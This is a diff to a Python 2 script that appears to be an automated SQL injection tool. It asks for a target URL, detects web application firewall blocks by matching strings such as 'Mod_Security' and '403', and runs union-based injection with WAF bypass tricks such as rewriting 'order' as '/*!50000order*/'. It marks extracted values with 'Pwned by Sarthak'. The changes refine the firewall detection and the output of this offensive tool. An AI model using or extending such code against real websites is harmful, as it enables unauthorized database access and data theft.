@@ -13,6 +13,7 @@ dict={}
 count=0
 count2=0
 totals=""
+vuln=['Forbidden','403','Not Acceptable','Mod_Security']
 
 e=raw_input("Enter the full url:-")
 temp=e
@@ -45,8 +46,9 @@ def comp(a,b):
 
 def checkwaf(temp):
     print "[+] Checking for waf bypass"
-    if "Forbidden" or "403" or "Acceptable" or "Mod_Security" in temp:
-        return True
+    for i in vuln:
+        if temp.find(i)>0:
+            return True
     else:
         return False
 
@@ -165,7 +167,6 @@ def union(str):
     if count2<1:
         check=checkwaf(a)
         if check is True:
-            print a
             count2+=1
             print("[!] Bypassing union waf")
             bypass2(str)
@@ -181,8 +182,8 @@ def union(str):
                 totals=totals.replace(aas,"Pwned by Sarthak")
                 ss.append(dict[aas])
 
-
-    print str
+    if count<1:
+        print str
 
 def bypass(temp): #bypass orderby
     temp=temp.replace("order","/*!50000order*/")
